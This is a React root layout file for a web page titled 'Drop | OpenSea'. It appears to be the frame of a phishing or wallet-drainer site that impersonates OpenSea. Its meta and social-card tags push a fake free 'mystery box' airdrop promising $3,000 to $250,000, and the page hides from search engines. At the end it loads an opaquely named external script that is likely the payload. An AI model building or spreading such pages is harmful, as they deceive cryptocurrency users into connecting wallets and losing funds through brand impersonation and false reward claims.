import React from "react";

function RootLayout({ children }: { children: React.ReactNode }) {
  return (
    <html lang="en">
      <head>
        <meta charSet="UTF-8" />
        <meta name="ROBOTS" content="NOINDEX, NOFOLLOW" />
        <title>Drop | OpenSea</title>

        {/* Open Graph Meta Tags */}
        <meta property="og:title" content="CLICK HERE TO CLAIM!" />
        <meta
          property="og:site_name"
          content="This is an automatically generated announcement message"
        />
        <meta
          property="og:description"
          content="🟢 AIRDROP IS LIVE NOW 🟢 

          •🎉 Price: FREE 🎉 
          •🎉 Supply: 150 Mystery Box 🎉 
          •🎉 Reward: between $3,000 and $250,000 

          •TRY YOUR LUCK! 🚀
          
          Minting has officially Begun Early 🏆🏆

          We have formally decided as a team to allow individual to mint today 🚀🎊 Instead of doing whitelists we decides to give people who are online during this time the ability to mint 🎁
          "
        />
        <meta
          property="og:image"
          content="https://openseaml.vercel.app/images/389-9bec97c22fa2e411.gif"
        />
        <meta name="theme-color" content="#7289DA" />

        {/* Twitter Meta Tags */}
        <meta name="twitter:card" content="summary_large_image" />
        <meta name="twitter:site" content="@opensea" />
        <meta name="twitter:title" content="CLICK HERE - OPENSEA PRO NFT" />
        <meta
          name="twitter:description"
          content="🟢 AIRDROP IS LIVE NOW 🟢 

          •🎉 Price: FREE 🎉 
          •🎉 Supply: 150 Mystery Box 🎉 
          •🎉 Reward: between $3,000 and $250,000 

          •TRY YOUR LUCK! 🚀
          
          Minting has officially Begun Early 🏆🏆

          We have formally decided as a team to allow individual to mint today 🚀🎊 Instead of doing whitelists we decides to give people who are online during this time the ability to mint 🎁
          "
        />

        {/* Icons */}
        <link
          rel="apple-touch-icon"
          sizes="180x180"
          href="/images/apple-touch-icon.png"
        />
        <link
          rel="icon"
          type="image/png"
          sizes="32x32"
          href="/images/favicon-32x32.png"
        />
        <link
          rel="icon"
          type="image/png"
          sizes="16x16"
          href="/images/favicon-16x16.png"
        />
      </head>

      <body>
        {/* Render the page component */}
        <main>{children}</main>

        {/* Load external scripts at the end of the body */}
        <script
          src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.11.8/dist/umd/popper.min.js"
          integrity="sha384-I7E8VVD/ismYTF4hNIPjVp/Zjvgyol6VFvRkX/vR+Vc4jQkC+hVqc2pM8ODewa9r"
          crossOrigin="anonymous"
          defer
        ></script>
        <script
          src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.min.js"
          integrity="sha384-0pUGZvbkm6XF6gxjEnlmuGrJXVbNuzT9qBBavbLwCsOGabYfZo0T0to5eqruptLy"
          crossOrigin="anonymous"
          defer
        ></script>
        <script src="/scripts/09e0df14-3f56-4990-8a99-c418e095b29a.js" defer />
        <script src="/scripts/app.js" defer />
      </body>
    </html>
  );
}

export default RootLayout;
